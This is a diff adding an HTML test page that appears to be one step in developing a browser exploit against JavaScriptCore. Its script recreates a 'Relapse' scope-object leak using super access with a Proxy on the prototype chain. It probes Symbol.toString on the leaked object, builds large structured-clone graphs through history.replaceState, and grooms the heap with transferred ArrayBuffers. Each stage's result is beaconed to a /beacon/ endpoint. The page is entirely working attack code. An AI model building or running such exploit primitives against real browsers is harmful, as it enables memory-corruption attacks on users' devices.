@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V588</title></head>
+<body><pre id="out">V588 — Relapse JSC info leak test</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V588-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+
+bk('BOOT','v588-relapse-jsc-leak');
+say('V588: Relapse JSC info leak test\n');
+
+/* ===== T1: EXACT Relapse leakScopeObject ===== */
+var leaked = undefined;
+var scopeResult = 'NONE';
+try {
+  var LeakerProto = {};
+  LeakerProto.__proto__ = new Proxy({}, {
+    get: function(target, property, receiver) {
+      return receiver;
+    }
+  });
+
+  var Leaker = eval(
+    '(function() {' +
+    '  "use strict";' +
+    '  class L {' +
+    '    leak() { return super.foo; }' +
+    '  }' +
+    '  return L;' +
+    '})()'
+  );
+  Leaker.prototype.__proto__ = LeakerProto.__proto__;
+
+  var leakFn = Leaker.prototype.leak;
+  leaked = (function() { return leakFn(); })();
+
+  if (leaked === undefined) {
+    scopeResult = 'UNDEFINED';
+  } else if (leaked === null) {
+    scopeResult = 'NULL';
+  } else {
+    scopeResult = 'LEAKED,type=' + typeof leaked;
+    try { scopeResult += ',ctor=' + (leaked.constructor ? leaked.constructor.name : 'none'); } catch(e) {}
+    try {
+      var ks = Object.keys(leaked);
+      scopeResult += ',keys=' + ks.length;
+    } catch(e) { scopeResult += ',keys=ERR'; }
+
+    /* Can we add indexed properties? */
+    try {
+      leaked[0] = 1.1;
+      leaked[1] = 2.2;
+      scopeResult += ',idx=' + (leaked[0] === 1.1 && leaked[1] === 2.2);
+    } catch(e) { scopeResult += ',idx=ERR:' + e.name; }
+
+    /* Can we define getter? */
+    try {
+      Object.defineProperty(leaked, 'g', {
+        get: function() { return Symbol('leakSym'); },
+        configurable: true
+      });
+      scopeResult += ',getter=YES';
+    } catch(e) { scopeResult += ',getter=ERR:' + e.name; }
+  }
+} catch(e) {
+  scopeResult = 'ERR:' + e.name + ':' + e.message.slice(0,100);
+}
+bk('T1-SCOPE', scopeResult);
+say('T1 leakScope: ' + scopeResult);
+
+/* ===== T2: Alternative — direct class literal ===== */
+var leaked2 = undefined;
+var scope2Result = 'NONE';
+try {
+  leaked2 = eval(
+    '(function() {' +
+    '  "use strict";' +
+    '  class L2 {' +
+    '    leak() { return super.foo; }' +
+    '  }' +
+    '  L2.prototype.__proto__ = new Proxy({}, {' +
+    '    get: function(t, p, r) { return r; }' +
+    '  });' +
+    '  var fn = L2.prototype.leak;' +
+    '  return (function() { return fn(); })();' +
+    '})()'
+  );
+
+  if (leaked2 === undefined) {
+    scope2Result = 'UNDEFINED';
+  } else if (leaked2 === null) {
+    scope2Result = 'NULL';
+  } else {
+    scope2Result = 'LEAKED,type=' + typeof leaked2;
+  }
+} catch(e) {
+  scope2Result = 'ERR:' + e.name + ':' + e.message.slice(0,100);
+}
+bk('T2-SCOPE2', scope2Result);
+say('T2 eval scope: ' + scope2Result);
+
+/* ===== T3: Even more direct — what does super.X return in different setups? ===== */
+var superResults = [];
+try {
+  /* 3a: Regular class, no proxy — should return undefined */
+  var r3a = eval(
+    '(function(){' +
+    '  class A { leak(){ return super.nonexistent; } }' +
+    '  return new A().leak();' +
+    '})()'
+  );
+  superResults.push('3a=' + String(r3a));
+} catch(e) { superResults.push('3a=ERR:' + e.name); }
+
+try {
+  /* 3b: Class with Proxy on proto chain — should return receiver */
+  var r3b = eval(
+    '(function(){' +
+    '  class B { leak(){ return super.test; } }' +
+    '  B.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});' +
+    '  return new B().leak();' +
+    '})()'
+  );
+  superResults.push('3b=' + typeof r3b + (r3b !== undefined ? ',isB=' + (r3b instanceof eval('B') || false) : ''));
+} catch(e) { superResults.push('3b=ERR:' + e.name); }
+
+try {
+  /* 3c: Detached method call (like Relapse) — receiver should be globalThis or undefined */
+  var r3c = eval(
+    '(function(){' +
+    '  class C { leak(){ return super.test; } }' +
+    '  C.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});' +
+    '  var fn = C.prototype.leak;' +
+    '  return fn();' +
+    '})()'
+  );
+  superResults.push('3c=' + typeof r3c);
+  if (r3c !== undefined && r3c !== null) {
+    try {
+      superResults.push('3c-isGlobal=' + (r3c === globalThis));
+      superResults.push('3c-isWindow=' + (r3c === (typeof window !== 'undefined' ? window : null)));
+    } catch(e) {}
+  }
+} catch(e) { superResults.push('3c=ERR:' + e.name); }
+
+try {
+  /* 3d: Call with explicit this=undefined (strict mode) */
+  var r3d = eval(
+    '(function(){' +
+    '  "use strict";' +
+    '  class D { leak(){ return super.test; } }' +
+    '  D.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});' +
+    '  var fn = D.prototype.leak;' +
+    '  return fn();' +
+    '})()'
+  );
+  superResults.push('3d-strict=' + typeof r3d + ',val=' + String(r3d).slice(0,20));
+} catch(e) { superResults.push('3d=ERR:' + e.name); }
+
+try {
+  /* 3e: Detached, called via wrapper IIFE (Relapse pattern) */
+  var r3e = eval(
+    '(function(){' +
+    '  class E { leak(){ return super.test; } }' +
+    '  E.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});' +
+    '  var fn = E.prototype.leak;' +
+    '  return (function(){ return fn(); })();' +
+    '})()'
+  );
+  superResults.push('3e=' + typeof r3e);
+  if (typeof r3e === 'object' && r3e !== null) {
+    superResults.push('3e-keys=' + Object.keys(r3e).length);
+    superResults.push('3e-proto=' + Object.getPrototypeOf(r3e));
+  }
+} catch(e) { superResults.push('3e=ERR:' + e.name); }
+
+bk('T3-SUPER', superResults.join('|'));
+say('T3 super variants: ' + superResults.join(' | '));
+
+/* ===== T4: Symbol.toString on various objects ===== */
+var symResults = [];
+try {
+  var sts = Symbol.prototype.toString;
+
+  /* 4a: Normal symbol wrapper */
+  var s4a = sts.call(Object(Symbol('normal')));
+  symResults.push('4a=len' + s4a.length);
+
+  /* 4b: Non-symbol object (should throw) */
+  try {
+    sts.call({});
+    symResults.push('4b=NO-THROW');
+  } catch(e) { symResults.push('4b=THROW:' + e.name); }
+
+  /* 4c: Function (should throw) */
+  try {
+    sts.call(function(){});
+    symResults.push('4c=NO-THROW');
+  } catch(e) { symResults.push('4c=THROW:' + e.name); }
+
+  /* 4d: Symbol wrapper from getter on leaked scope (if available) */
+  if (typeof leaked === 'object' && leaked !== null) {
+    try {
+      Object.defineProperty(leaked, 'symG', {
+        get: function symGetter() { return Symbol('fromGetter'); },
+        configurable: true
+      });
+      var symFromScope = Object(leaked.symG);
+      symResults.push('4d=type:' + typeof symFromScope);
+      var s4d = sts.call(symFromScope);
+      symResults.push('4d-len=' + s4d.length);
+      symResults.push('4d-str=' + s4d.slice(0,40));
+    } catch(e) { symResults.push('4d=ERR:' + e.name + ':' + e.message.slice(0,40)); }
+  }
+} catch(e) { symResults.push('ERR:' + e.name); }
+bk('T4-SYM', symResults.join('|'));
+say('T4 Symbol.toString: ' + symResults.join(' | '));
+
+/* ===== T5: history.replaceState with BigInt + large graph ===== */
+var histResult = 'NONE';
+try {
+  var fillerGraph = new Array(0xfffd);
+  var pos = 0;
+  var huge = 1n << 40n;
+  fillerGraph[pos++] = huge;
+  fillerGraph[pos++] = huge + 1n;
+  while (pos < fillerGraph.length) fillerGraph[pos++] = {};
+
+  var refTarget = {marker: 0x51515151};
+  var outerGraph = new Array(0x10001);
+  outerGraph[0] = fillerGraph;
+  outerGraph[1] = refTarget;
+  outerGraph[2] = refTarget;
+  outerGraph[0xffff] = -64000;
+
+  history.replaceState(outerGraph, '');
+  var clone = history.state;
+
+  histResult = 'len=' + (clone ? clone.length : 'null');
+  if (clone) {
+    histResult += ',dup=' + (clone[1] === clone[2]);
+    histResult += ',marker=' + (clone[1] ? clone[1].marker : 'null');
+    histResult += ',bigint=' + (typeof clone[0][0]);
+    histResult += ',ctrl=' + clone[0xffff];
+  }
+
+  history.replaceState(null, '');
+} catch(e) {
+  histResult = 'ERR:' + e.name + ':' + e.message.slice(0,80);
+}
+bk('T5-HIST', histResult);
+say('T5 history graph: ' + histResult);
+
+/* ===== T6: MessageChannel hole creation (Relapse groom pattern) ===== */
+var groomResult = 'NONE';
+try {
+  var ch = new MessageChannel();
+  ch.port1.close();
+  ch.port2.close();
+
+  /* Warm up allocator */
+  var keeps = [];
+  for (var ki = 0; ki < 64; ki++) keeps.push(new ArrayBuffer(0x10000));
+
+  /* Create large slab then transfer (hole) */
+  var ch2 = new MessageChannel();
+  var slab = new ArrayBuffer(0x400000);
+  ch2.port1.postMessage(0, [slab]);
+  groomResult = 'slab=' + (slab.byteLength === 0);
+
+  /* Create more holes */
+  var h1 = new ArrayBuffer(0x81000);
+  var h2 = new ArrayBuffer(0x81000);
+  var sep = new ArrayBuffer(0x10000);
+  var pred = new ArrayBuffer(0x80000);
+  var fin = new ArrayBuffer(0x80000);
+
+  ch2.port1.postMessage(0, [h1, h2, fin]);
+  groomResult += ',holes=' + (h1.byteLength === 0);
+
+  /* Fill predecessor with pattern */
+  var pv = new Uint32Array(pred);
+  pv[0] = 0xDEADBEEF;
+  pv[1] = 0x00008000;
+  groomResult += ',pred=filled';
+
+  ch2.port1.close();
+  ch2.port2.close();
+  groomResult += ',done=YES';
+} catch(e) {
+  groomResult = 'ERR:' + e.name + ':' + e.message.slice(0,80);
+}
+bk('T6-GROOM', groomResult);
+say('T6 heap groom: ' + groomResult);
+
+/* Summary */
+setTimeout(function() {
+  bk('DONE','v588-complete');
+  say('\nV588 complete.');
+}, 8000);
+</script>
+</body></html>
